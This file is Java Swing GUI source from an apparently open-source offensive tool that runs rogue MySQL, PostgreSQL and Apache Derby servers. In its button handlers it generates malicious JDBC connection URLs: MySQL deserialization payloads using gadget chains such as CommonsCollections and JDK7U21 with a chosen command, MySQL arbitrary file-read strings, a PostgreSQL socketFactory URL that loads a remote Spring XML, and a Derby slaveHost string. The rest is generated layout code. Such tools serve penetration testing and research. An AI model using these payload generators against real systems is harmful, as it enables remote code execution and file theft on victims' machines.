package me.n1ar4.fake.gui.form;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import com.intellij.uiDesigner.core.Spacer;
import me.n1ar4.derby.EvilSlaveServer;
import me.n1ar4.fake.gui.Constant;
import me.n1ar4.fake.gui.util.PortUtil;
import me.n1ar4.fake.gui.util.StringUtil;
import me.n1ar4.fake.gui.util.TipUtil;
import me.n1ar4.fake.log.LogUtil;
import me.n1ar4.fake.pgsql.XmlServer;
import me.n1ar4.fake.proto.GadgetResolver;
import me.n1ar4.fake.proto.MySQLServer;
import me.n1ar4.fake.proto.Version;
import okhttp3.*;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.net.URI;
import java.util.Base64;
import java.util.Random;

public class FakeServer {
    private static boolean useCustom = false;
    private JPanel masterPanel;
    private JPanel lefPanel;
    private JPanel rightPanel;
    private JTextField ipText;
    private JTextField portText;
    private JPanel logPanel;
    private JTextArea logArea;
    private JScrollPane logStroll;
    private JLabel ipLabel;
    private JLabel portLabel;
    private JButton useLocalButton;
    private JButton randomFreePortButton;
    private JButton startServerButton;
    private JTextField generateText;
    private JButton copyButton;
    private JTextField addrText;
    private JButton generatePayloadButton;
    private JRadioButton jdk7Button;
    private JRadioButton jdk8Button;
    private JRadioButton cbButton;
    private JRadioButton cc31Button;
    private JRadioButton cc44Button;
    private JRadioButton urldnsButton;
    private JLabel statusLabel;
    private JLabel statusResultLabel;
    private JPanel gadgetPanel;
    private JPanel payloadPanel;
    private JLabel generateLabel;
    private JLabel addrLabel;
    private JLabel cmdFileLabel;
    private JTextField cmdFileText;
    private JLabel modeLabel;
    private JRadioButton deserButton;
    private JRadioButton fileReadButton;
    private JRadioButton detectCustomCollationsRadioButton;
    private JRadioButton serverStatusDiffInterceptorRadioButton;
    private JRadioButton v5105118RadioButton;
    private JRadioButton v602606RadioButton;
    private JRadioButton v51195128RadioButton;
    private JRadioButton v8078020RadioButton;
    private JRadioButton v51295148RadioButton;
    private JLabel typeLabel;
    private JPanel jdbcVersionPanel;
    private JButton stopServerButton;
    private JPanel opPanel;
    private JButton generateBase64Button;
    private JButton cleanButton;
    private JButton applyButton;
    private JTextArea gadgetArea;
    private JScrollPane scroll;
    private JRadioButton useCustomGadgetBase64RadioButton;
    private JPanel customPanel;
    private JTabbedPane tabbedPanel;
    private JPanel mysqlPanel;
    private JPanel pgsqlPanel;
    private JPanel pgBindPane;
    private JTextField pgIpText;
    private JLabel pgIpLabel;
    private JLabel pgPortLabel;
    private JTextField pgPortText;
    private JButton pgRanPortBtn;
    private JButton pgUse0Btn;
    private JPanel pgStatusPane;
    private JLabel pgStatusLabel;
    private JLabel psStartStop;
    private JPanel pgStartPane;
    private JButton pgStartServerBtn;
    private JButton pgStopServerBtn;
    private JPanel configPanel;
    private JTextField pgAddrText;
    private JLabel addressLabel;
    private JRadioButton windowsRadioButton;
    private JRadioButton linuxRadioButton;
    private JPanel winLinuxPanel;
    private JPanel outputPanel;
    private JTextField pgUrlText;
    private JButton generatePostgreSQLDriverPayloadButton;
    private JTextArea pgPayloadArea;
    private JLabel pgUrlLabel;
    private JScrollPane pgPayloadScroll;
    private JLabel pgCmdLabel;
    private JTextField pgCmdText;
    private JPanel derbyPanel;
    private JTextArea dbSerDataArea;
    private JPanel dbPanel;
    private JPanel dbStatusPanel;
    private JPanel dbAddrPanel;
    private JPanel dbSerPanel;
    private JPanel dbPayloadPanel;
    private JTextField dbIpText;
    private JLabel dbIpLabel;
    private JLabel dbPortLabel;
    private JTextField dbPortText;
    private JButton dbRanPortBtn;
    private JButton dbUse0Btn;
    private JLabel dbStatusLabel;
    private JLabel dbStartStop;
    private JPanel dbOpPanel;
    private JButton dbStartBtn;
    private JButton dbStopBtn;
    private JLabel dbUrlLabel;
    private JButton genDerbyPayloadBtn;
    private JScrollPane dbPayScroll;
    private JTextField dbUrlText;
    private JScrollPane dbSerScroll;
    private JTextArea dbPayArea;
    private JLabel dbAddrLabel;
    private JTextField dbAddrText;

    public static String generateRandomXmlString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        int length = 8;
        Random random = new Random();
        StringBuilder sb = new StringBuilder();
        sb.append("/");
        for (int i = 0; i < length; i++) {
            int index = random.nextInt(characters.length());
            char randomChar = characters.charAt(index);
            sb.append(randomChar);
        }
        sb.append(".xml");
        return sb.toString();
    }

    public FakeServer() {
        LogUtil.setT(this.logArea);
        this.gadgetArea.setLineWrap(true);
        this.pgPayloadArea.setLineWrap(true);
        this.dbSerDataArea.setLineWrap(true);
        this.dbPayArea.setLineWrap(true);
        this.addrText.setText("ip:port");
        this.pgAddrText.setText("ip:port");
        this.dbAddrText.setText("ip:port");
        this.deserButton.setSelected(true);
        this.cbButton.setSelected(true);
        this.serverStatusDiffInterceptorRadioButton.setSelected(true);
        this.deserButton.setSelected(true);
        this.v8078020RadioButton.setSelected(true);
        this.statusResultLabel.setText(Constant.STOP);
        this.statusResultLabel.setForeground(Color.RED);
        this.windowsRadioButton.setSelected(true);
        this.psStartStop.setText(Constant.STOP);
        this.psStartStop.setForeground(Color.RED);
        this.dbStartStop.setText(Constant.STOP);
        this.dbStartStop.setForeground(Color.RED);
        this.randomFreePortButton.addActionListener(e -> this.portText.setText(PortUtil.getFreePort()));
        this.pgRanPortBtn.addActionListener(e -> {
            String p = PortUtil.getFreePort();
            this.pgPortText.setText(p);
            pgAddrText.setText("127.0.0.1:" + p);
        });
        this.dbRanPortBtn.addActionListener(e -> {
            String p = PortUtil.getFreePort();
            this.dbPortText.setText(p);
            dbAddrText.setText("127.0.0.1:" + p);
        });
        this.useLocalButton.addActionListener(e -> this.ipText.setText("0.0.0.0"));
        this.pgUse0Btn.addActionListener(e -> this.pgIpText.setText("0.0.0.0"));
        this.dbUse0Btn.addActionListener(e -> this.dbIpText.setText("0.0.0.0"));
        this.dbStartBtn.addActionListener(e -> {
            String ip = dbIpText.getText();
            String port = dbPortText.getText();
            if (StringUtil.isNull(ip) || StringUtil.isNull(port)) {
                TipUtil.error("ip or port is null");
                return;
            }
            String baseData = dbSerDataArea.getText();
            if (StringUtil.isNull(baseData)) {
                TipUtil.error("serialization data is null");
                return;
            }
            dbStartStop.setText(Constant.RUNNING);
            dbStartStop.setForeground(Color.GREEN);
            dbStartBtn.setEnabled(false);
            dbStopBtn.setEnabled(true);
            new Thread(() -> {
                try {
                    EvilSlaveServer.start(ip, Integer.parseInt(port), baseData);
                } catch (Exception ex) {
                    ex.printStackTrace();
                    LogUtil.log(ex.toString());
                }
            }).start();
            String addr = dbAddrText.getText();
            @SuppressWarnings("all")
            String finalStr = String.format("tcp://%s", addr);
            dbUrlText.setText(finalStr);
            LogUtil.log("start apache derby server");
        });
        this.dbStopBtn.addActionListener(e -> {
            EvilSlaveServer.stop();
            new Thread(() -> {
                try {
                    Socket socket = new Socket("127.0.0.1", EvilSlaveServer.getPort());
                    socket.getOutputStream().write("test".getBytes());
                    socket.close();
                } catch (Exception ignored) {
                }
            }).start();
            LogUtil.log("apache derby server stopped");
            dbStartStop.setText(Constant.STOP);
            dbStartStop.setForeground(Color.red);
            dbStartBtn.setEnabled(true);
            dbStopBtn.setEnabled(false);
        });
        this.pgStartServerBtn.addActionListener(e -> {
            String ip = pgIpText.getText();
            String port = pgPortText.getText();
            String cmd = pgCmdText.getText();
            if (StringUtil.isNull(ip) || StringUtil.isNull(port) || StringUtil.isNull(cmd)) {
                TipUtil.error("ip or port or cmd is null");
                return;
            }
            psStartStop.setText(Constant.RUNNING);
            psStartStop.setForeground(Color.GREEN);
            pgStartServerBtn.setEnabled(false);
            pgStopServerBtn.setEnabled(true);
            String path = generateRandomXmlString();
            LogUtil.log("use path: " + path);
            new Thread(() -> {
                try {
                    XmlServer.start(ip, Integer.parseInt(port),
                            windowsRadioButton.isSelected() ? "windows" : "linux",
                            cmd, path);
                } catch (Exception ex) {
                    ex.printStackTrace();
                    LogUtil.log(ex.toString());
                }
            }).start();
            String addr = pgAddrText.getText();
            @SuppressWarnings("all")
            String finalStr = String.format("http://%s%s", addr, path);
            pgUrlText.setText(finalStr);
        });
        this.pgStopServerBtn.addActionListener(e -> {
            XmlServer.stop();
            LogUtil.log("pgsql server stopped");
            psStartStop.setText(Constant.STOP);
            psStartStop.setForeground(Color.red);
            pgStartServerBtn.setEnabled(true);
            pgStopServerBtn.setEnabled(false);
        });
        generatePostgreSQLDriverPayloadButton.addActionListener(e -> {
            String temp = "jdbc:postgresql://%s/test/?socketFactory=%s&socketFactoryArg=%s";
            String fmt = String.format(temp, pgAddrText.getText(),
                    "org.springframework.context.support.ClassPathXmlApplicationContext",
                    pgUrlText.getText());
            pgPayloadArea.setText(fmt);
        });
        genDerbyPayloadBtn.addActionListener(e -> {
            String tempDb = generateRandomXmlString().substring(1, 6);
            String temp = "(1) Create a new database: ";
            temp = temp + tempDb + "\njdbc:derby:" + tempDb + ";create=true" + "\n";
            temp = temp + "(2) Use payload: \n" + "jdbc:derby:" +
                    tempDb + ";startMaster=true;slaveHost=127.0.0.1;slavePort=" + dbPortText.getText() + ";";
            dbPayArea.setText(temp);
        });
        this.startServerButton.addActionListener(e -> {
            String ip = ipText.getText();
            String port = portText.getText();
            MySQLServer.unsetStop();
            if (StringUtil.isNull(ip) || StringUtil.isNull(port)) {
                TipUtil.error("ip or port is null");
                return;
            }
            MySQLServer.setIp(ip.trim());
            MySQLServer.setPort(Integer.parseInt(port.trim()));
            new Thread(MySQLServer::StartServer).start();
            statusResultLabel.setText(Constant.RUNNING);
            statusResultLabel.setForeground(Color.GREEN);
            startServerButton.setEnabled(false);
            stopServerButton.setEnabled(true);
        });
        this.stopServerButton.addActionListener(e -> {
            MySQLServer.stop();
            LogUtil.log("mysql fake server stopped");
            new Thread(() -> {
                try {
                    // 触发新循环
                    Socket socket = new Socket("127.0.0.1", MySQLServer.getPort());
                    socket.getOutputStream().write("test".getBytes());
                    socket.close();
                } catch (Exception ignored) {
                }
            }).start();
            statusResultLabel.setText(Constant.STOP);
            statusResultLabel.setForeground(Color.red);
            startServerButton.setEnabled(true);
            stopServerButton.setEnabled(false);
        });
        this.generatePayloadButton.addActionListener(e -> {
            if (fileReadButton.isSelected()) {
                String filename = cmdFileText.getText();
                if (StringUtil.isNull(filename)) {
                    TipUtil.error("filename is null");
                    return;
                }
                filename = "fileread_" + filename;
                String addr = addrText.getText();
                if (StringUtil.isNull(addr)) {
                    TipUtil.error("addr is null");
                    return;
                }
                String poc;
                if (v8078020RadioButton.isSelected()) {
                    poc = String.format(Constant.MySQLReadFile8Temp, addr, filename);
                } else {
                    poc = String.format(Constant.MySQLReadFile56Temp, addr, filename);
                }
                this.generateText.setText(poc);
                this.generateText.setCaretPosition(0);
                return;
            }
            String gadget;
            if (cbButton.isSelected()) {
                gadget = "deser_CB";
            } else if (cc31Button.isSelected()) {
                gadget = "deser_CC31";
            } else if (cc44Button.isSelected()) {
                gadget = "deser_CC44";
            } else if (jdk7Button.isSelected()) {
                gadget = "deser_JDK7U21";
            } else if (jdk8Button.isSelected()) {
                gadget = "deser_JDK8U20";
            } else if (urldnsButton.isSelected()) {
                gadget = "deser_URLDNS";
            } else if (useCustom) {
                gadget = "deser_CUSTOM";
            } else {
                TipUtil.error("gadget is null");
                return;
            }
            String addr = addrText.getText();
            if (StringUtil.isNull(addr)) {
                TipUtil.error("addr is null");
                return;
            }
            String cmd = cmdFileText.getText();
            if (StringUtil.isNull(cmd) && !useCustom) {
                TipUtil.error("cmd is null");
                return;
            }

            if (!useCustom) {
                gadget = gadget + "_" + cmd.trim();
            }

            String temp = null;
            if (serverStatusDiffInterceptorRadioButton.isSelected()) {
                if (v5105118RadioButton.isSelected() ||
                        v51195128RadioButton.isSelected() ||
                        v51295148RadioButton.isSelected()) {
                    temp = Constant.MySQL510T5XSTemp;
                } else if (v602606RadioButton.isSelected()) {
                    temp = Constant.MySQL6XSTemp;
                } else if (v8078020RadioButton.isSelected()) {
                    temp = Constant.MySQLT8020STemp;
                }
            } else if (detectCustomCollationsRadioButton.isSelected()) {
                if (v5105118RadioButton.isSelected()) {
                    TipUtil.error("only support serverStatusDiffInterceptor");
                    return;
                } else if (v51195128RadioButton.isSelected()) {
                    temp = Constant.MySQL5119T5128DTemp;
                } else if (v51295148RadioButton.isSelected()) {
                    temp = Constant.MySQL5129T5148DTemp;
                } else if (v602606RadioButton.isSelected()) {
                    temp = Constant.MySQL6XDTemp;
                } else if (v8078020RadioButton.isSelected()) {
                    TipUtil.error("only support serverStatusDiffInterceptor");
                    return;
                }
            } else {
                TipUtil.error("type is null");
                return;
            }
            if (temp == null) {
                return;
            }
            String poc = String.format(temp, addr, gadget);
            this.generateText.setText(poc);
            this.generateText.setCaretPosition(0);
        });
        this.generateBase64Button.addActionListener(e -> {
            if (fileReadButton.isSelected()) {
                String filename = cmdFileText.getText();
                if (StringUtil.isNull(filename)) {
                    TipUtil.error("filename is null");
                    return;
                }
                filename = "fileread_" + filename;
                filename = "base64" + Base64.getEncoder().encodeToString(filename.getBytes());
                String addr = addrText.getText();
                if (StringUtil.isNull(addr)) {
                    TipUtil.error("addr is null");
                    return;
                }
                String poc;
                if (v8078020RadioButton.isSelected()) {
                    poc = String.format(Constant.MySQLReadFile8Temp, addr, filename);
                } else {
                    poc = String.format(Constant.MySQLReadFile56Temp, addr, filename);
                }
                this.generateText.setText(poc);
                this.generateText.setCaretPosition(0);
                return;
            }
            String gadget;
            if (cbButton.isSelected()) {
                gadget = "deser_CB";
            } else if (cc31Button.isSelected()) {
                gadget = "deser_CC31";
            } else if (cc44Button.isSelected()) {
                gadget = "deser_CC44";
            } else if (jdk7Button.isSelected()) {
                gadget = "deser_JDK7U21";
            } else if (jdk8Button.isSelected()) {
                gadget = "deser_JDK8U20";
            } else if (urldnsButton.isSelected()) {
                gadget = "deser_URLDNS";
            } else if (useCustom) {
                gadget = "deser_CUSTOM";
            } else {
                TipUtil.error("gadget is null");
                return;
            }
            String addr = addrText.getText();
            if (StringUtil.isNull(addr)) {
                TipUtil.error("addr is null");
                return;
            }
            String cmd = cmdFileText.getText();
            if (StringUtil.isNull(cmd) && !useCustom) {
                TipUtil.error("cmd is null");
                return;
            }
            if (!useCustom) {
                gadget = gadget + "_" + cmd.trim();
            }
            gadget = "base64" + Base64.getEncoder().encodeToString(gadget.getBytes());
            String temp = null;
            if (serverStatusDiffInterceptorRadioButton.isSelected()) {
                if (v5105118RadioButton.isSelected() ||
                        v51195128RadioButton.isSelected() ||
                        v51295148RadioButton.isSelected()) {
                    temp = Constant.MySQL510T5XSTemp;
                } else if (v602606RadioButton.isSelected()) {
                    temp = Constant.MySQL6XSTemp;
                } else if (v8078020RadioButton.isSelected()) {
                    temp = Constant.MySQLT8020STemp;
                }
            } else if (detectCustomCollationsRadioButton.isSelected()) {
                if (v5105118RadioButton.isSelected()) {
                    TipUtil.error("only support serverStatusDiffInterceptor");
                    return;
                } else if (v51195128RadioButton.isSelected()) {
                    temp = Constant.MySQL5119T5128DTemp;
                } else if (v51295148RadioButton.isSelected()) {
                    temp = Constant.MySQL5129T5148DTemp;
                } else if (v602606RadioButton.isSelected()) {
                    temp = Constant.MySQL6XDTemp;
                } else if (v8078020RadioButton.isSelected()) {
                    TipUtil.error("only support serverStatusDiffInterceptor");
                    return;
                }
            } else {
                TipUtil.error("type is null");
                return;
            }
            if (temp == null) {
                return;
            }
            String poc = String.format(temp, addr, gadget);
            this.generateText.setText(poc);
            this.generateText.setCaretPosition(0);
        });
        this.copyButton.addActionListener(e -> {
            String poc = generateText.getText();
            if (StringUtil.isNull(poc)) {
                TipUtil.error("poc is null");
                return;
            }
            StringSelection selection = new StringSelection(poc);
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            clipboard.setContents(selection, null);
            TipUtil.info("copied!");
        });
        this.applyButton.addActionListener(e -> {
            String text = gadgetArea.getText();
            if (text == null || text.isEmpty()) {
                JOptionPane.showMessageDialog(masterPanel, "gadget data is null");
                return;
            }
            GadgetResolver.setCustomGadget(text);
            useCustom = true;
            useCustomGadgetBase64RadioButton.setSelected(true);
            JOptionPane.showMessageDialog(masterPanel, "save ok");
        });
        this.cleanButton.addActionListener(e -> {
            useCustom = false;
            GadgetResolver.setCustomGadget(null);
            cbButton.setSelected(true);
            JOptionPane.showMessageDialog(masterPanel, "cancel custom gadget");
        });
        new Thread(() -> {
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder()
                    .url("https://api.github.com/repos/4ra1n/mysql-fake-server/releases/latest")
                    .addHeader("Connection", "close")
                    .build();

            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
            client.newCall(request).enqueue(new Callback() {
                @Override
                @SuppressWarnings("all")
                public void onFailure(Call call, IOException e) {
                    // ignored
                }

                @Override
                @SuppressWarnings("all")
                public void onResponse(Call call, Response response) {
                    try {
                        if (response.body() == null) {
                            return;
                        }
                        String body = response.body().string();
                        String ver = body.split("\"tag_name\":")[1].split(",")[0];
                        ver = ver.substring(1, ver.length() - 1);

                        if (!ver.equals(Version.version)) {
                            String output;
                            output = String.format("New Version!\n%s: %s\n%s: %s\n%s",
                                    "Your Current Version", Version.version,
                                    "Latest Version", ver,
                                    "https://github.com/4ra1n/mysql-fake-server/releases/latest");
                            JOptionPane.showMessageDialog(masterPanel, output);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        }).start();
    }

    public static void start() {
        JFrame frame = new JFrame(Constant.FakeServer);
        frame.setJMenuBar(createMenuBar());
        frame.setResizable(false);
        frame.setContentPane(new FakeServer().masterPanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setVisible(true);
    }

    private static JMenuBar createMenuBar() {
        JMenuBar menuBar = new JMenuBar();
        menuBar.add(createAboutMenu());
        menuBar.add(createVersionMenu());
        return menuBar;
    }

    private static JMenu createAboutMenu() {
        try {
            JMenu aboutMenu = new JMenu("Help");
            JMenuItem bugItem = new JMenuItem("Report Bug");
            InputStream is = FakeServer.class.getClassLoader().getResourceAsStream("issue.png");
            if (is == null) {
                return null;
            }
            ImageIcon imageIcon = new ImageIcon(ImageIO.read(is));
            bugItem.setIcon(imageIcon);
            aboutMenu.add(bugItem);
            bugItem.addActionListener(e -> {
                try {
                    Desktop desktop = Desktop.getDesktop();
                    URI oURL = new URI("https://github.com/4ra1n/mysql-fake-server/issues");
                    desktop.browse(oURL);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            });

            JMenuItem authorItem = new JMenuItem("Github");
            is = FakeServer.class.getClassLoader().getResourceAsStream("address.png");
            if (is == null) {
                return null;
            }
            imageIcon = new ImageIcon(ImageIO.read(is));
            authorItem.setIcon(imageIcon);
            aboutMenu.add(authorItem);
            authorItem.addActionListener(e -> {
                try {
                    Desktop desktop = Desktop.getDesktop();
                    URI oURL = new URI("https://github.com/4ra1n/mysql-fake-server");
                    desktop.browse(oURL);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            });
            return aboutMenu;
        } catch (Exception ex) {
            return null;
        }
    }

    private static JMenu createVersionMenu() {
        try {
            JMenu verMenu = new JMenu("Version");
            JMenuItem jarItem = new JMenuItem("Current Version: " + Version.version);
            InputStream is = FakeServer.class.getClassLoader().getResourceAsStream("ver.png");
            if (is == null) {
                return null;
            }
            ImageIcon imageIcon = new ImageIcon(ImageIO.read(is));
            jarItem.setIcon(imageIcon);

            JMenuItem downItem = new JMenuItem("Check Latest Version");
            downItem.setIcon(imageIcon);
            downItem.addActionListener(e -> {
                OkHttpClient client = new OkHttpClient();
                Request request = new Request.Builder()
                        .url("https://api.github.com/repos/4ra1n/mysql-fake-server/releases/latest")
                        .addHeader("Connection", "close")
                        .build();
                client.newCall(request).enqueue(new Callback() {
                    @Override
                    @SuppressWarnings("all")
                    public void onFailure(Call call, IOException e) {
                        TipUtil.error(e.toString());
                    }

                    @Override
                    @SuppressWarnings("all")
                    public void onResponse(Call call, Response response) {
                        try {
                            if (response.body() == null) {
                                TipUtil.error("network error");
                            }
                            String body = response.body().string();
                            String ver = body.split("\"tag_name\":")[1].split(",")[0];
                            ver = ver.substring(1, ver.length() - 1);

                            String output;
                            output = String.format("%s: %s\n%s: %s",
                                    "Your Version", Version.version,
                                    "Latest Version", ver);
                            TipUtil.info(output);
                        } catch (Exception ex) {
                            TipUtil.error(ex.toString());
                        }
                    }
                });
            });

            verMenu.add(jarItem);
            verMenu.add(downItem);
            return verMenu;
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }

    {
// GUI initializer generated by IntelliJ IDEA GUI Designer
// >>> IMPORTANT!! <<<
// DO NOT EDIT OR ADD ANY CODE HERE!
        $$$setupUI$$$();
    }

    /**
     * Method generated by IntelliJ IDEA GUI Designer
     * >>> IMPORTANT!! <<<
     * DO NOT edit this method OR call it in your code!
     *
     * @noinspection ALL
     */
    private void $$$setupUI$$$() {
        masterPanel = new JPanel();
        masterPanel.setLayout(new GridLayoutManager(3, 1, new Insets(0, 0, 0, 0), -1, -1));
        masterPanel.setBackground(new Color(-1120293));
        tabbedPanel = new JTabbedPane();
        tabbedPanel.setBackground(new Color(-1120294));
        tabbedPanel.setEnabled(true);
        masterPanel.add(tabbedPanel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, new Dimension(200, 200), null, 0, false));
        mysqlPanel = new JPanel();
        mysqlPanel.setLayout(new GridLayoutManager(3, 2, new Insets(0, 0, 0, 0), -1, -1));
        mysqlPanel.setBackground(new Color(-1120294));
        tabbedPanel.addTab("MySQL", mysqlPanel);
        lefPanel = new JPanel();
        lefPanel.setLayout(new GridLayoutManager(2, 5, new Insets(10, 10, 10, 10), -1, -1));
        lefPanel.setBackground(new Color(-1120293));
        mysqlPanel.add(lefPanel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        lefPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        ipText = new JTextField();
        lefPanel.add(ipText, new GridConstraints(0, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        ipLabel = new JLabel();
        ipLabel.setText("Bind IP");
        lefPanel.add(ipLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        portLabel = new JLabel();
        portLabel.setText("Bind Port");
        lefPanel.add(portLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        portText = new JTextField();
        lefPanel.add(portText, new GridConstraints(1, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        randomFreePortButton = new JButton();
        randomFreePortButton.setText("Random Free Port");
        lefPanel.add(randomFreePortButton, new GridConstraints(1, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        useLocalButton = new JButton();
        useLocalButton.setText("USE 0.0.0.0");
        lefPanel.add(useLocalButton, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        rightPanel = new JPanel();
        rightPanel.setLayout(new GridLayoutManager(2, 4, new Insets(10, 10, 10, 10), -1, -1));
        rightPanel.setBackground(new Color(-1120293));
        mysqlPanel.add(rightPanel, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        rightPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        statusLabel = new JLabel();
        statusLabel.setText("Status: ");
        rightPanel.add(statusLabel, new GridConstraints(0, 0, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        statusResultLabel = new JLabel();
        statusResultLabel.setText("STOP");
        rightPanel.add(statusResultLabel, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        opPanel = new JPanel();
        opPanel.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
        opPanel.setBackground(new Color(-1120293));
        rightPanel.add(opPanel, new GridConstraints(1, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        startServerButton = new JButton();
        startServerButton.setText("Start Server");
        opPanel.add(startServerButton, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
        stopServerButton = new JButton();
        stopServerButton.setText("Stop Server");
        opPanel.add(stopServerButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
        payloadPanel = new JPanel();
        payloadPanel.setLayout(new GridLayoutManager(10, 17, new Insets(0, 0, 0, 0), -1, -1));
        payloadPanel.setBackground(new Color(-1120293));
        mysqlPanel.add(payloadPanel, new GridConstraints(1, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        payloadPanel.setBorder(BorderFactory.createTitledBorder(null, "Payload Panel", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        generateLabel = new JLabel();
        generateLabel.setText("Generate");
        payloadPanel.add(generateLabel, new GridConstraints(9, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        generateText = new JTextField();
        payloadPanel.add(generateText, new GridConstraints(9, 3, 1, 11, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        addrLabel = new JLabel();
        addrLabel.setText("Addr");
        payloadPanel.add(addrLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        addrText = new JTextField();
        addrText.setText("");
        payloadPanel.add(addrText, new GridConstraints(0, 3, 1, 14, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        copyButton = new JButton();
        copyButton.setText("Copy Payload");
